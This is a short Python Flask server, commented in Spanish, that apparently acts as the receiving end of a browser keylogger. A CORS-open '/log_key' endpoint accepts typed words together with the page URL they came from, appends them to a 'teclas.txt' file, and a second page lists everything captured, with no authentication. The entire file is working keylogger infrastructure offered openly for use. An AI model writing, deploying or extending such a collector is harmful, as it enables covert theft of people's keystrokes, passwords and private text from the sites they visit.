#!/usr/bin/python
#-*- coding: utf-8 -*-
#Autor: Luis Angel Ramirez Mendoza


from flask import Flask, request, jsonify, render_template
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Ruta para manejar las palabras recibidas
@app.route('/log_key', methods=['POST'])
def log_key():
    data = request.get_json()  # Obtener el JSON con la palabra y la URL
    word = data.get('word', '')  # Extraer la palabra del JSON
    url = data.get('url', '')  # Extraer la URL del JSON

    # Almacena la palabra y la URL en un archivo de texto
    with open('teclas.txt', 'a') as file:
        file.write(f'Informacion: {word}, URL: {url}\n')  # Escribe la palabra y la URL en el archivo

    print(f'Informacion registrada: {word}, URL: {url}')  # Imprimir la palabra y la URL en la consola

    return jsonify({'status': 'success', 'word': word, 'url': url})

# Ruta para mostrar las palabras almacenadas
@app.route('/mostrar_teclas', methods=['GET'])
def mostrar_teclas():
    # Lee las palabras del archivo de texto
    with open('teclas.txt', 'r') as file:
        teclas = file.readlines()

    # Elimina los caracteres de nueva línea
    teclas = [tecla.strip() for tecla in teclas]
    
    return render_template('mostrar_teclas.html', teclas=teclas)

# Ruta principal
@app.route('/')
def home():
    return '<a href="/mostrar_teclas">Informacion Registrada: </a>'

if __name__ == '__main__':
    app.run(port=5001, debug=True)




   
